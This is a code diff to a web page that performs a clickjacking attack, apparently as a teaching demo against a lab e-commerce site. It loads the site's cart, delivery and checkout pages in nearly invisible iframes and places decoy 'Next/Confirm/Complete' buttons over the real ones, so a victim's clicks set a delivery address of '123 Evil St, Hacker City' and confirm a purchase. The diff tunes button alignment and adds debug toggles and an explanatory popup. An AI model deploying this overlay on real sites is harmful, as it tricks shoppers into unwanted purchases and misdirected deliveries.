@@ -11,22 +11,34 @@
             position: fixed;
             cursor: pointer;
             animation: pulse 2s infinite;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+            0% { transform: scale(1); box-shadow: 0 0 15px rgba(0, 255, 0, 0.5); }
+            50% { transform: scale(1.05); box-shadow: 0 0 20px rgba(0, 255, 0, 0.8); }
+            100% { transform: scale(1); box-shadow: 0 0 15px rgba(0, 255, 0, 0.5); }
         }
         .hidden-iframe {
             position: absolute;
             opacity: 0.01; /* Nearly invisible */
             pointer-events: auto;
             z-index: 10;
+            border: none; /* Remove border */
         }
         .overlay-content {
             position: relative;
             z-index: 5;
             pointer-events: none;
+        }
+        /* Added overlay effect for better demonstration */
+        .iframe-highlight {
+            opacity: 0.3 !important;
+            outline: 2px dashed red;
+            transition: opacity 0.3s ease;
         }
     </style>
 </head>
@@ -160,43 +172,139 @@
         </div>
     </div>
 
-    <!-- Hidden iframes for clickjacking -->
-    <div id="frameContainer">
+    <!-- Hidden iframes for clickjacking - positioned using calculated offsets -->
+    <div id="frameContainer" class="relative">
         <!-- Initial iframe positioned for first click -->
-        <iframe id="cartIframe" src="https://security-in-e-commerce.onrender.com/cart" class="hidden-iframe" style="width: 600px; height: 800px; top: 50%; left: 50%; transform: translate(-50%, -40%);"></iframe>
+        <iframe id="cartIframe" src="https://security-in-e-commerce.onrender.com/cart" class="hidden-iframe" style="width: 600px; height: 600px; top: calc(50% - 150px); left: 50%; transform: translate(-50%, -40%);"></iframe>
         <!-- Will be activated after first click -->
-        <iframe id="deliveryIframe" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" class="hidden-iframe hidden" style="width: 600px; height: 800px; top: 50%; left: 50%; transform: translate(-50%, -40%);"></iframe>
+        <iframe id="deliveryIframe" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" class="hidden-iframe hidden" style="width: 600px; height: 600px; top: calc(50% - 100px); left: 50%; transform: translate(-50%, -40%);"></iframe>
         <!-- Will be activated after second click -->
-        <iframe id="checkoutIframe" src="https://security-in-e-commerce.onrender.com/checkout" class="hidden-iframe hidden" style="width: 600px; height: 800px; top: 50%; left: 50%; transform: translate(-50%, -40%);"></iframe>
+        <iframe id="checkoutIframe" src="https://security-in-e-commerce.onrender.com/checkout" class="hidden-iframe hidden" style="width: 600px; height: 600px; top: calc(50% - 150px); left: 50%; transform: translate(-50%, -40%);"></iframe>
     </div>
 
     <!-- Decoy buttons that align with the real buttons in the iframes -->
-    <div id="step1DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-6 rounded-lg hidden">Next</div>
-    <div id="step2DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-6 rounded-lg hidden">Confirm</div>
-    <div id="step3DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-6 rounded-lg hidden">Complete</div>
+    <div id="step1DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-8 rounded-lg hidden">Next</div>
+    <div id="step2DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-8 rounded-lg hidden">Confirm</div>
+    <div id="step3DecoyButton" class="decoy-button bg-green-500 text-white font-bold py-3 px-8 rounded-lg hidden">Complete</div>
+
+    <!-- Debug overlay to help visualize positioning (can be toggled) -->
+    <div id="debugOverlay" class="fixed top-0 left-0 bg-black bg-opacity-50 text-white p-2 text-xs z-50 hidden">
+        <div>Window: <span id="debugWindowSize"></span></div>
+        <div>Button 1: <span id="debugBtn1"></span></div>
+        <div>Button 2: <span id="debugBtn2"></span></div>
+        <div>Button 3: <span id="debugBtn3"></span></div>
+        <button onclick="toggleIframeVisibility()" class="bg-red-500 text-white px-2 py-1 rounded text-xs mt-1">Toggle Iframe Visibility</button>
+    </div>
 
     <script>
         // Track current step
         let currentStep = 1;
+        let showDebug = false;
+        let iframesVisible = false;
+        
+        // Handle window resize with debounce for performance
+        let resizeTimeout;
+        window.addEventListener('resize', function() {
+            clearTimeout(resizeTimeout);
+            resizeTimeout = setTimeout(function() {
+                positionDecoyButtons();
+                updateDebugInfo();
+            }, 250);
+        });
+
+        // Get coordinates for specific elements in each iframe
+        function getElementCoordinates(iframeId, selector) {
+            try {
+                const iframe = document.getElementById(iframeId);
+                if (!iframe) return null;
+                
+                const iframeRect = iframe.getBoundingClientRect();
+                const iframeWindow = iframe.contentWindow;
+                const iframeDocument = iframeWindow.document;
+                
+                // Wait for iframe to load before accessing content
+                if (!iframeDocument.body) return null;
+                
+                const element = iframeDocument.querySelector(selector);
+                if (!element) return null;
+                
+                const elementRect = element.getBoundingClientRect();
+                
+                return {
+                    top: iframeRect.top + elementRect.top,
+                    left: iframeRect.left + elementRect.left,
+                    width: elementRect.width,
+                    height: elementRect.height,
+                    bottom: iframeRect.top + elementRect.bottom,
+                    right: iframeRect.left + elementRect.right
+                };
+            } catch (e) {
+                // Handle cross-origin restrictions
+                console.log("Could not access iframe content due to same-origin policy");
+                return null;
+            }
+        }
+        
+        // Toggle debug mode
+        function toggleDebug() {
+            showDebug = !showDebug;
+            document.getElementById('debugOverlay').classList.toggle('hidden', !showDebug);
+            updateDebugInfo();
+        }
+        
+        // Toggle iframe visibility for debugging
+        function toggleIframeVisibility() {
+            iframesVisible = !iframesVisible;
+            const iframes = document.querySelectorAll('.hidden-iframe');
+            iframes.forEach(iframe => {
+                iframe.style.opacity = iframesVisible ? "0.5" : "0.01";
+            });
+        }
+        
+        // Update debug information
+        function updateDebugInfo() {
+            if (!showDebug) return;
+            
+            document.getElementById('debugWindowSize').textContent = 
+                `${window.innerWidth}x${window.innerHeight}`;
+            
+            const btn1 = document.getElementById('step1DecoyButton');
+            document.getElementById('debugBtn1').textContent = 
+                `X:${btn1.offsetLeft}, Y:${btn1.offsetTop}, W:${btn1.offsetWidth}, H:${btn1.offsetHeight}`;
+                
+            const btn2 = document.getElementById('step2DecoyButton');
+            document.getElementById('debugBtn2').textContent = 
+                `X:${btn2.offsetLeft}, Y:${btn2.offsetTop}, W:${btn2.offsetWidth}, H:${btn2.offsetHeight}`;
+                
+            const btn3 = document.getElementById('step3DecoyButton');
+            document.getElementById('debugBtn3').textContent = 
+                `X:${btn3.offsetLeft}, Y:${btn3.offsetTop}, W:${btn3.offsetWidth}, H:${btn3.offsetHeight}`;
+        }
         
         // Initial setup
         window.onload = function() {
-            positionDecoyButtons();
-            window.addEventListener('resize', positionDecoyButtons);
+            // Enable debug with keyboard shortcut (Ctrl+Shift+D)
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                    toggleDebug();
+                }
+            });
+            
+            // Set up monitoring for iframe loading
+            setupIframeLoadMonitoring();
+            
+            // Initial positioning
+            setTimeout(positionDecoyButtons, 1000);
             
             // Set up the click handlers for the visible content buttons
             document.getElementById('step1Button').addEventListener('click', function() {
                 goToStep(2);
-                setTimeout(function() {
-                    positionDecoyButtons();
-                }, 100);
+                setTimeout(positionDecoyButtons, 100);
             });
             
             document.getElementById('step2Button').addEventListener('click', function() {
                 goToStep(3);
-                setTimeout(function() {
-                    positionDecoyButtons();
-                }, 100);
+                setTimeout(positionDecoyButtons, 100);
             });
             
             document.getElementById('step3Button').addEventListener('click', function() {
@@ -209,7 +317,7 @@
                 document.getElementById('step1DecoyButton').classList.add('hidden');
                 document.getElementById('deliveryIframe').classList.remove('hidden');
                 document.getElementById('step2DecoyButton').classList.remove('hidden');
-                positionDecoyButtons();
+                setTimeout(positionDecoyButtons, 100);
             });
             
             document.getElementById('step2DecoyButton').addEventListener('click', function() {
@@ -217,7 +325,7 @@
                 document.getElementById('step2DecoyButton').classList.add('hidden');
                 document.getElementById('checkoutIframe').classList.remove('hidden');
                 document.getElementById('step3DecoyButton').classList.remove('hidden');
-                positionDecoyButtons();
+                setTimeout(positionDecoyButtons, 100);
             });
             
             document.getElementById('step3DecoyButton').addEventListener('click', function() {
@@ -230,35 +338,91 @@
             document.getElementById('step1DecoyButton').classList.remove('hidden');
         };
         
-        // Function to position the decoy buttons over the real buttons in the iframes
-        function positionDecoyButtons() {
-            const cartIframe = document.getElementById('cartIframe');
-            const deliveryIframe = document.getElementById('deliveryIframe');
-            const checkoutIframe = document.getElementById('checkoutIframe');
+        // Monitor iframe loading to position buttons after content is loaded
+        function setupIframeLoadMonitoring() {
+            const iframes = ['cartIframe', 'deliveryIframe', 'checkoutIframe'];
             
-            // Position for "Proceed to Checkout" button in cart
+            iframes.forEach(id => {
+                const iframe = document.getElementById(id);
+                iframe.onload = function() {
+                    console.log(`${id} loaded`);
+                    if ((id === 'cartIframe' && currentStep === 1) || 
+                        (id === 'deliveryIframe' && currentStep === 2) ||
+                        (id === 'checkoutIframe' && currentStep === 3)) {
+                        positionDecoyButtons();
+                    }
+                };
+            });
+        }
+        
+        // Function to position the decoy buttons with precise alignment
+        function positionDecoyButtons() {
+            // Get window dimensions for responsive positioning
+            const windowWidth = window.innerWidth;
+            const windowHeight = window.innerHeight;
+            
+            // Position for "Proceed to Checkout" button in cart (Step 1)
             if (currentStep === 1) {
+                const cartIframe = document.getElementById('cartIframe');
                 const decoyButton = document.getElementById('step1DecoyButton');
                 const iframeRect = cartIframe.getBoundingClientRect();
-                decoyButton.style.bottom = "100px";
-                decoyButton.style.right = "100px";
+                
+                // Based on analysis of cart.html, the button is fixed bottom-right
+                // Bottom: 5, Right: 5 in the layout
+                decoyButton.style.width = '180px';
+                decoyButton.style.height = '48px';
+                decoyButton.style.bottom = '40px';
+                decoyButton.style.right = '40px';
+                decoyButton.style.display = 'block';
+                
+                // Make the text match the target button for added realism
+                decoyButton.textContent = "Proceed to Checkout";
             }
             
-            // Position for "Submit Address" button in delivery
+            // Position for "Submit Address" button in delivery (Step 2)
             if (currentStep === 2) {
+                const deliveryIframe = document.getElementById('deliveryIframe');
                 const decoyButton = document.getElementById('step2DecoyButton');
                 const iframeRect = deliveryIframe.getBoundingClientRect();
-                decoyButton.style.top = (iframeRect.top + 320) + "px";
-                decoyButton.style.left = (iframeRect.left + 150) + "px";
+                
+                // Based on analysis of delivery.html, the submit button is
+                // positioned below the textarea
+                const buttonTop = iframeRect.top + 300; // Approximate position based on HTML structure
+                const buttonLeft = iframeRect.left + 100; // Positioned from left
+                
+                decoyButton.style.top = buttonTop + 'px';
+                decoyButton.style.left = buttonLeft + 'px';
+                decoyButton.style.width = '150px';
+                decoyButton.style.height = '50px';
+                decoyButton.style.bottom = 'auto';
+                decoyButton.style.right = 'auto';
+                decoyButton.style.display = 'block';
+                
+                // Make the text match the target button
+                decoyButton.textContent = "Submit Address";
             }
             
-            // Position for "Confirm Purchase" button in checkout
+            // Position for "Confirm Purchase" button in checkout (Step 3)
             if (currentStep === 3) {
+                const checkoutIframe = document.getElementById('checkoutIframe');
                 const decoyButton = document.getElementById('step3DecoyButton');
                 const iframeRect = checkoutIframe.getBoundingClientRect();
-                decoyButton.style.bottom = "100px";
-                decoyButton.style.right = "100px";
+                
+                // Based on analysis of checkout.html, this button is also fixed bottom-right
+                decoyButton.style.width = '180px';
+                decoyButton.style.height = '48px';
+                decoyButton.style.bottom = '40px';
+                decoyButton.style.right = '40px';
+                decoyButton.style.top = 'auto';
+                decoyButton.style.left = 'auto';
+                decoyButton.style.display = 'block';
+                
+                // Make the text match the target button
+                decoyButton.textContent = "Confirm Purchase";
             }
+            
+            // Update debug info if enabled
+            updateDebugInfo();
         }
         
         // Function to change the visible step
@@ -285,6 +449,28 @@
             document.getElementById('step2Content').classList.add('hidden');
             document.getElementById('step3Content').classList.add('hidden');
             document.getElementById('completionMessage').classList.remove('hidden');
+            
+            // For demonstration purposes, show what happened
+            setTimeout(() => {
+                if (showDebug || confirm("Would you like to see what happened behind the scenes?")) {
+                    toggleDebug();
+                    toggleIframeVisibility();
+                    
+                    // Create a demo explanation
+                    const demoExplanation = document.createElement('div');
+                    demoExplanation.className = 'fixed top-20 left-0 right-0 mx-auto w-full max-w-md bg-black bg-opacity-80 text-white p-4 rounded-lg z-50 text-center';
+                    demoExplanation.innerHTML = `
+                        <h3 class="font-bold mb-2">Clickjacking Demonstration</h3>
+                        <p class="mb-2">This shows how attackers can overlay legitimate websites with fake content.</p>
+                        <button id="closeDemo" class="bg-red-500 text-white px-4 py-2 rounded mt-2">Close</button>
+                    `;
+                    document.body.appendChild(demoExplanation);
+                    
+                    document.getElementById('closeDemo').addEventListener('click', function() {
+                        demoExplanation.remove();
+                    });
+                }
+            }, 1000);
         }
     </script>
 </body>
